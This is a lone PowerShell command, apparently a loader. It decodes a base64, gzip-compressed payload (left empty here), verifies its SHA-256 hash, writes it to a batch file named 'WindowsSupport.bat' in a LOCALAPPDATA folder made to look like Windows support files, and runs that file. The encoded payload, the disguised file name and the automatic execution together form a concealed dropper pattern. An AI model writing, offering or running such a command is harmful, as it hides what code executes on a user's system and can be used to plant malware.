powershell.exe -NoLogo -NoProfile -Command "$b='';$m=[IO.MemoryStream]::new([Convert]::FromBase64String($b));$g=[IO.Compression.GzipStream]::new($m,[IO.Compression.CompressionMode]::Decompress);$o=[IO.MemoryStream]::new();$g.CopyTo($o);$a=$o.ToArray();$g.Dispose();$m.Dispose();$h=[Security.Cryptography.SHA256]::Create();$v=[BitConverter]::ToString($h.ComputeHash($a)).Replace('-','').ToLowerInvariant();$h.Dispose();if($v -ne '5ef53bb653e91fdade4375c440c897f0587b47e543f22ea28a694e0d507b1276'){throw 'Checksum mismatch'};$d=Join-Path $env:LOCALAPPDATA 'WindowsSupport\Releases\5ef53bb653e9';New-Item -ItemType Directory -Path $d -Force|Out-Null;$p=Join-Path $d 'WindowsSupport.bat';if(Test-Path -LiteralPath $p){if((Get-FileHash -LiteralPath $p).Hash.ToLowerInvariant() -ne $v){throw 'Existing release changed'}}else{[IO.File]::WriteAllBytes($p,$a)};& $env:ComSpec /d /c ('call '+[char]34+$p+[char]34)"
